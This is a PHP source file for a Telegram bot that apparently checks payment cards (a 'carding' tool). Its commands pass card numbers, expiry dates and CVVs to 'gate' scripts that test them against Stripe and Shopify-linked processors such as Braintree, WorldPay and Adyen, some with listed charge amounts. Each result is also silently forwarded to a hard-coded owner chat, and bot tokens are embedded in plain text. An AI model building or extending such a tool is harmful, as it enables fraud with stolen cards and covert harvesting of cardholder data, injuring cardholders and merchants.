<?php

$bot_token = '6530776361:AAFmo9-O9yrtVK29sDgkJ5FpynQPhvR46O0';
$api_url = "https://api.telegram.org/bot$bot_token/";
$update = json_decode(file_get_contents('php://input'), true);
$chat_id = $update['message']['chat']['id'];
$r_id = $update["message"]["reply_to_message"];
$isfile = $update['message']['document'];
$file_id = $update['message']['document']['file_id'];
$message_id = $update["message"]["message_id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$lastname = $update["message"]["from"]["last_name"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$r_userId = $update["message"]["reply_to_message"]["from"]["id"];
$r_firstname = $update["message"]["reply_to_message"]["from"]["first_name"];  
$r_username = $update["message"]["reply_to_message"]["from"]["username"]; 
$r_msg_id = $update["message"]["reply_to_message"]["message_id"]; 
$r_msg = $update["message"]["reply_to_message"]["text"]; 
$premium = $update["message"]["from"]["is_premium"];
$p1 = (boolval($premium) ? 'True' : 'False');
$ownerid = '6685318446';

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}

function sendAsyncRequest($url, $data) {
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data ));
        $response = curl_exec($curl);
        curl_close($curl);
        return $response;}
$update = json_decode(file_get_contents('php://input'), true);
if (isset($update['message'])) {
    $message = $update['message'];
    $text = $message['text'];
if(!empty($r_id)){
$r_msg = $update["message"]["reply_to_message"]["text"]; 
$message = $update["message"]["text"]; 
$text = $message ." ".$r_msg;
}

  ///////////////Command/////////////
    if ((strpos($text, "/sfb") === 0)||(strpos($text, "/au") === 0)||(strpos($text, "/sfv") === 0)||(strpos($text, "/sfo") === 0)||(strpos($text, "/su") === 0)||(strpos($text, "/sfc") === 0)||(strpos($text, "/chg") === 0)||(strpos($text, "/sfs") === 0)||(strpos($text, "/sfw") === 0)||(strpos($text, "/sfm") === 0)||(strpos($text, "/sfr") === 0)||(strpos($text, "/sfk") === 0)||(strpos($text, "/sfz") === 0)||(strpos($text, "/sfd") === 0)||(strpos($text, "/sfe") === 0)||(strpos($text, "/msffb") === 0)||(strpos($text, "/vbv") === 0)||(strpos($text, "/sfj") === 0)||(strpos($text, "/filter") === 0)||(strpos($text, "/ax") === 0)||(strpos($text, "/asy") === 0)||(strpos($text, "/sfa") === 0)||(strpos($text, "/sfp") === 0)||(strpos($text, "/sfq") === 0)||(strpos($text, "/sfg") === 0)) {

    /*if ($gId != 5264501009 and $gId != 5221813293 and $gId != 5082252468 ) { $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐁𝐨𝐭 𝐈𝐬 𝐃𝐨𝐰𝐧 ",
                'reply_to_message_id' => $message_id,
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}*/
      
    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);

    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => 'Processing....',
        'reply_to_message_id' => $message_id ));
    $response = sendAsyncRequest($url, $data);

    $message_idd = json_decode($response)->result->message_id;
    if ((strpos($text, "/sfb") === 0)||(strpos($text, ".sfb") === 0)){
    include 'Gates/sfb.php';}
    if ((strpos($text, "/au") === 0)||(strpos($text, ".au") === 0)){
    include 'Gates/au.php';}
    if ((strpos($text, "/sfo") === 0)||(strpos($text, ".sfo") === 0)){
    include 'Gates/sfo.php';}
    if ((strpos($text, "/sfv") === 0)||(strpos($text, ".sfv") === 0)){
    include 'Gates/sfv.php';}
    if ((strpos($text, "/su") === 0)||(strpos($text, ".su") === 0)){
    include 'Gates/su.php';}
    if ((strpos($text, "/sfc") === 0)||(strpos($text, ".sfc") === 0)){
    include 'Gates/sfc.php';}
    if ((strpos($text, "/chg") === 0)||(strpos($text, ".chg") === 0)){
    include 'Gates/chg.php';}
    if ((strpos($text, "/sfs") === 0)||(strpos($text, ".sfs") === 0)){
    include 'Gates/sfs.php';}
    if ((strpos($text, "/sfw") === 0)||(strpos($text, ".sfw") === 0)){
    include 'Gates/sfw.php';}
    if ((strpos($text, "/sfm") === 0)||(strpos($text, ".sfm") === 0)){
    include 'Gates/sfm.php';}
    if ((strpos($text, "/sfr") === 0)||(strpos($text, ".sfr") === 0)){
    include 'Gates/sfr.php';}
    if ((strpos($text, "/sfk") === 0)||(strpos($text, ".sfk") === 0)){
    include 'Gates/sfk.php';}
    if ((strpos($text, "/sfz") === 0)||(strpos($text, ".sfz") === 0)){
    include 'Gates/sfz.php';}
    if ((strpos($text, "/sfd") === 0)||(strpos($text, ".sfd") === 0)){
    include 'Gates/sfd.php';}
    if ((strpos($text, "/sfe") === 0)||(strpos($text, ".sfe") === 0)){
    include 'Gates/sfe.php';}
    if ((strpos($text, "/msfb") === 0)||(strpos($text, ".msfb") === 0)){
    include 'Gates/msfb.php';}
    if ((strpos($text, "/sfj") === 0)||(strpos($text, ".sfj") === 0)){
    include 'Gates/sfj.php';}
    if ((strpos($text, "/cex") === 0)||(strpos($text, ".cex") === 0)){
    include 'Gates/mass.php';}
    if ((strpos($text, "/fil") === 0)||(strpos($text, ".fil") === 0)){
    include 'Gates/filter.php';}
    if ((strpos($text, "/vbv") === 0)||(strpos($text, ".vbv") === 0)){
    include 'Gates/vbv.php';}
    if ((strpos($text, "/ax") === 0)||(strpos($text, ".ax") === 0)){
    include 'Gates/ax.php';}
    if ((strpos($text, "/asy") === 0)||(strpos($text, ".asy") === 0)){
    include 'Gates/asy.php';}
    if ((strpos($text, "/sfa") === 0)||(strpos($text, ".sfa") === 0)){
    include 'Gates/sfa.php';}
    if ((strpos($text, "/sfp") === 0)||(strpos($text, ".sfp") === 0)){
    include 'Gates/sfp.php';}
    if ((strpos($text, "/sfq") === 0)||(strpos($text, ".sfq") === 0)){
    include 'Gates/sfq.php';}
    if ((strpos($text, "/sfg") === 0)||(strpos($text, ".sfg") === 0)){
    include 'Gates/sfg.php';}

    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => $ccrsp,
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$url = 'https://api.telegram.org/bot6530776361:AAFmo9-O9yrtVK29sDgkJ5FpynQPhvR46O0/sendMessage';
    $data = http_build_query(array(
        'chat_id' => 6685318446,
        'text' => $ccrsp,
        'parse_mode' => 'HTML'));
    $response = sendAsyncRequest($url, $data);
}

/*if ((strpos($text, "cex") === 0) || (strpos($text, "/cex") === 0)) {
$url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);
  
  include 'Gates/mass.php';
}*/
  
/////////////////End////////////////
    if ((strpos($text, "cmds") === 0) || (strpos($text, "/cmds") === 0)) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);

    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => 'Processing....',
        'reply_to_message_id' => $message_id ));
    $response = sendAsyncRequest($url, $data);

    $message_idd = json_decode($response)->result->message_id;

    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "• <b>𝔾𝕒𝕥𝕖𝕤\n\n➺ Stripe Auth\n\n⤳ Stripe Auth (v1)⇝ /au ✅\n⤳ Stripe Auth+3D (v2) ⇝ /su ✅\n⤳ Stripe Auth (v3)⇝ /ax ✅\n\n➺ Shopify Gates\n\n⤳ Shopify+Cybersource (v1) 1$ ⇝ /sfc ✅ \n⤳ Shopify+Cybersource (v2) 24$ ⇝ /sfs ✅\n⤳ Shopify+Braintree (v1) 8.5$ ⇝ /sfv ☠\n⤳ Shopify+Braintree (v2) 11.72$ ⇝ /sfo ☠\n⤳ Shopify+Braintree (v3) 15$ ⇝ /sfb ✅\n⤳ Shopify+Braintree (v4) 25$ ⇝ /sfk ✅\n⤳ Shopify+Braintree (v5) 40$ ⇝ /sfz ✅\n⤳ Shopify+WorldPay (v1) 9$ ⇝ /sfw ✅\n⤳ Shopify+WorldPay (v2) 36$ ⇝ /sfr ✅ \n⤳ Shopify+Moneris (v1) 10$ ⇝ /sfm ☠\n⤳ Shopify+Chase (v1) 6$ ⇝ /sfe ✅\n⤳ Shopify+Payflow (v1) 20$ ⇝ /sfp ✅\n⤳ Shopify+Eway (v1) 10$ ⇝ /sfj ✅\n⤳ Shopify+Adyen (v1) 20$ ⇝ /sfa ✅\n\n Format Preference - cc mon year cvv </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
}
  include 'Tools/Credits.php';
}

error_reporting(E_ALL);
ini_set('display_errors', 1);
/*
$API_KEY = '6089717639:AAF5a8j3ZIJMFr5PPwnNjK6vo8MQZk5XZvA';
$API_URL = "https://api.telegram.org/bot{$API_KEY}/";
$update = json_decode(file_get_contents("php://input"), true);
$chat_id = $update['message']['chat']['id'];
$message = $update['message']['text'];
$message_id = $update['message']['message_id'];
$document = isset($update['message']['document']) ? $update['message']['document'] : null;

if ($document) {
    $file_id = $document['file_id'];
    $file = json_decode(file_get_contents($API_URL . "getFile?file_id={$file_id}"), true);
    $file_path = $file['result']['file_path'];
    $file_content = file_get_contents("https://api.telegram.org/file/bot{$API_KEY}/" . $file_path);
    $filename = $document['file_name'];

    file_put_contents($filename, $file_content);
    $msg_text = "File '$filename' downloaded successfully!";
    file_get_contents($API_URL . "sendMessage?chat_id=$chat_id&text=$msg_text&reply_to_message_id=$message_id");
} elseif ($message == '/merge') {
    $files = glob("*.html");

    if (count($files) > 0) {
        $merged_content = '';

        foreach ($files as $file) {
            $merged_content .= file_get_contents($file) . PHP_EOL;
        }

        file_put_contents('Merged.txt', $merged_content);

        $cfile = new CURLFile(realpath('Merged.txt'));
        $data = [
            'chat_id' => $chat_id,
            'document' => $cfile,
            'reply_to_message_id' => $message_id,
        ];

        $ch = curl_init($API_URL . 'sendDocument');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
        curl_close($ch);
        unlink('Merged.txt');
        // Delete all .txt files
        foreach ($files as $file) {
            unlink($file);
        }
    } else {
        file_get_contents($API_URL . "sendMessage?chat_id={$chat_id}&text=No+files+to+merge.");
    }
}
  */
?>
